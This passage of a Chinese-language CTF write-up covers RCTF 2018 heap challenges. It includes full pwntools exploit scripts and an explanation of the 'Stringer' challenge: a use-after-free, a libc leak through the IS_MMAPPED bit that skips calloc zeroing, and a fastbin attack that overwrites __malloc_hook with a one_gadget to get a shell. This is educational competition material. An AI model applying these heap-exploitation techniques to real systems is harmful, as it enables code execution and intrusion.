    	p = remote(remote_addr,remote_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    else:
    	p = remote(local_addr,local_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    
    context.log_level = True
    
    if local:
    	if atta:
    		gdb.attach(p,'b *0xD43+0x555555554000\n b*0xF25+0x555555554000')
    		#b *0x0804887F \n 
    		#0x400b6a
    
    def ru(a):
    	return p.recvuntil(a)
    
    def sn(a):
    	p.send(a)
    
    def rl():
    	return p.recvline()
    
    def sl(a):
    	p.sendline(a)
    
    def rv(a):
    	return p.recv(a)
    
    def raddr(a,l=None):
    	if l == None:
    		return u64(rv(a).ljust(8,'\x00'))
    	else:
    		return u64(rl().strip('\n').ljust(8,'\x00'))
    
    def lg(s,addr):
    	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    
    def sa(a,b):
    	p.sendafter(a,b)
    
    def sla(a,b):
    	p.sendlineafter(a,b)
    	
    def alloc_chunk(len,content):
    	sla('choice: ','1')
    	sla('size: ',str(len))
    	sla('content: ',content)
    
    def show_chunk(index):
    	sla('choice: ','2')
    	sla('index: ',str(index))
    
    
    def del_chunk(index):
    	sla('choice: ','3')
    	sla('index: ',str(index))
    
    def hack():
    	raw_input()
    	alloc_chunk(0x48,'A')
    	payload = (p64(0x100) + p64(0x21))*15 + p64(0x100) + '\x21'
    	alloc_chunk(0xf9,payload)
    	alloc_chunk(0xf9,'A')
    	alloc_chunk(0x68,'A')
    	alloc_chunk(0x48,'A')
    
    	del_chunk(1)
    	del_chunk(0)
    	payload = 'A'*0x48
    	alloc_chunk(0x48,payload)
    
    	alloc_chunk(0x98,'A')
    	alloc_chunk(0x58,'A')
    
    	del_chunk(1)
    	del_chunk(2)
    
    	alloc_chunk(0x98,'A')
    	show_chunk(5)
    	ru('content: ')
    	top_addr = u64(rv(6).ljust(8,'\x00'))
    	lg('top_addr',top_addr)
    
    	libc.address = top_addr - 0x58 - 0x3C4B20
    	lg('libc.address',libc.address)
    
    	malloc_hook = libc.symbols['__malloc_hook']
    	lg('malloc_hook',malloc_hook)
    
    	# one_gadget0 = libc.address + 0x45216
    	# one_gadget1 = libc.address + 0x4526a
    	# one_gadget2 = libc.address + 0xf02a4
    	one_gadget3 = libc.address + 0xf1147
    	# system_addr = libc.symbols['system']
    	# lg('system_addr',system_addr)
    
    	fake_fd = malloc_hook - 0x28 + 5
    
    	alloc_chunk(0x68,'A')
    
    	del_chunk(5)
    	del_chunk(3)
    	del_chunk(2)
    
    	alloc_chunk(0x68,p64(fake_fd))
    	alloc_chunk(0x68,'A')
    	alloc_chunk(0x68,'A')
    
    	realloc_addr = libc.symbols['realloc']
    	lg('realloc',realloc_addr)
    	payload = 'A'*0x3 + p64(one_gadget3)*2 + p64(realloc_addr)
    	alloc_chunk(0x68,payload)
    
    	#alloc_chunk(0x20,'A')
    	sla('choice: ','1')
    	sla('size: ',str(1))
    	
    	p.interactive()
    
    hack()
# Stringer #
## 1.题目分析 ##
乍一看，题目好像只存在一个UAF漏洞，在delete_string()函数中，未对释放后的指针进行清0，漏洞如下所示：  
![uaf](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/picture/uaf_free.PNG)  
查看程序保护机制，发现保护机制全开，因此必须找到一处能够进行信息泄露的地方。  
由于该程序中对堆块的申请使用了calloc()函数，该函数会对分配到的chunk进行清0，无法进行信息泄露。  
之后，通过查资料和阅读源码得知如果设置chunk的IS\_MMAPPED字段（0x2），则分配后的chunk不会被清0。因此可使用此方法进行信息泄露。
## 2.漏洞利用 ##
### 2.1 leak libc ###
使用overlap+uaf的方法进行信息泄露。  
具体利用过程为： 
 
	new_string(0x80,'A')	#0
	new_string(0x80,'A')	#1
	new_string(0x68,'A')	#2
	new_string(0x68,'A')	#3
	new_string(0x20,'A')	#4

	delete_string(0)
	delete_string(1)

	payload = (p64(0) + p64(0x91)) * 9
	new_string(0x90,payload)	#5
	new_string(0x70,'A')	#6

	delete_string(1)

	edit_string(5,0x88)
	edit_string(5,0x88)
首先将两个大小为0x90的chunk0，chunk1释放，然后申请一个大小为0xa0的chunk5包含chunk1的头部，并对chunk1的头部进行覆写，然后再次申请一个大小为0x80的chunk6，保证当前unsortedbin链表为空。  

接着利用uaf漏洞，再次释放chunk1。使用edit_string功能编辑chunk5的0x88处的字节（即size字段的第一个字节，使其变成0x93）。这样再次申请一个0x90大小的chunk时，chunk1就会被返回且由于该chunk被标记为**IS\_MMAPPED**，并不会对其内容进行清空，从而泄露出libc地址。

	new_string(0x80,'AAAAAAA')	#7
	ru('string: AAAAAAA\x0a')
	top_addr = u64(rv(6).ljust(8,'\x00'))
	lg('top_addr',top_addr)
	libc.address = top_addr - 0x58 - 0x3C4B20
	lg('libc.address',libc.address)
	malloc_hook_ptr = libc.symbols['__malloc_hook']
	lg('malloc_hook_ptr',malloc_hook_ptr)
	one_gadget = libc.address + 0xf02a4
	lg('one_gadget',one_gadget)
### 2.2 fastbin attack ###
利用思路与babyheap的fastbin attack一样。释放同一个fastbin两次，并改写fd指针即可。
## 3.expolit代码 ##
    from pwn import *
    from ctypes import *
    import os
    #import roputils as rop
    
    remote_addr = "stringer.2018.teamrois.cn"
    remote_port = 7272
    
    # local_addr = "127.0.0.1"
    # local_port = 1807
    
    pc = "./stringer"
    pwn_elf = ELF(pc)
    pwn_rop = rop.ROP(pc)
    
    uselibc = 2 #0 for no,1 for i386,2 for x64
    local = 1
    haslibc = 1
    atta = 0
    
    if uselibc == 2:
    	context.arch = "amd64"
    else:
    	context.arch = "i386"
    
    if uselibc ==2 and haslibc == 0:
    	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    else:
    	if uselibc == 1 and haslibc == 0:
    		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    	else:
    		libc = ELF('./libc.so.6')
    
    if local == 1:
    	if haslibc:
    		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
    	else:
    		p = process(pc)
    elif local == 0:
    	p = remote(remote_addr,remote_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    else:
    	p = remote(local_addr,local_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    
    context.log_level = True
    
    if local:
    	if atta:
    		gdb.attach(p,'b *0x0000000000000D5E+0x555555554000\n')
    		#b *0x0804887F \n 
    		#0x400b6a
    
    def ru(a):
    	return p.recvuntil(a)
    
    def sn(a):
    	p.send(a)
    
    def rl():
    	return p.recvline()
    
    def sl(a):
    	p.sendline(a)
    
    def rv(a):
    	return p.recv(a)
    
    def raddr(a,l=None):
    	if l == None:
    		return u64(rv(a).ljust(8,'\x00'))
    	else:
    		return u64(rl().strip('\n').ljust(8,'\x00'))
    
    def lg(s,addr):
    	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    
    def sa(a,b):
    	p.sendafter(a,b)
    
    def sla(a,b):
    	p.sendlineafter(a,b)
    	
    def new_string(size,content):
    	sla('choice: ','1')
    	sla('length: ',str(size))
    	sla('content: ',content)
    
    def edit_string(index,byte_i):
    	sla('choice: ','3')
    	sla('the index: ',str(index))
    	sla('byte index: ',str(byte_i))
    
    def delete_string(index):
    	sla('choice: ','4')
    	sla('index: ',str(index))
    
    def hack():
    	raw_input()
    	new_string(0x80,'A')	#0
    	new_string(0x80,'A')	#1
    	new_string(0x68,'A')	#2
    	new_string(0x68,'A')	#3
    	new_string(0x20,'A')	#4
    
    	delete_string(0)
    	delete_string(1)
    
    	payload = (p64(0) + p64(0x91)) * 9
    	new_string(0x90,payload)	#5
    	new_string(0x70,'A')	#6
    
    	delete_string(1)
    
    	edit_string(5,0x88)
    	edit_string(5,0x88)
    
    	new_string(0x80,'AAAAAAA')	#7
    	ru('string: AAAAAAA\x0a')
    	top_addr = u64(rv(6).ljust(8,'\x00'))
    	lg('top_addr',top_addr)
    	libc.address = top_addr - 0x58 - 0x3C4B20
    	lg('libc.address',libc.address)
    	malloc_hook_ptr = libc.symbols['__malloc_hook']
    	lg('malloc_hook_ptr',malloc_hook_ptr)
    	one_gadget = libc.address + 0xf02a4
    	lg('one_gadget',one_gadget)
    	
    	delete_string(2)
    	delete_string(3)
    	delete_string(2)
    
    	malloc_hook = libc
    	fake_fd = malloc_hook_ptr - 0x28 + 5
    	new_string(0x68,p64(fake_fd))
    	new_string(0x68,'A')
    	new_string(0x68,'A')
    	payload = 'A'*3 + p64(one_gadget)*3
    	new_string(0x68,payload)
    
    	sla('choice: ','1')
    	sla('length: ',str(1))
    
    	p.interactive()
    
    hack()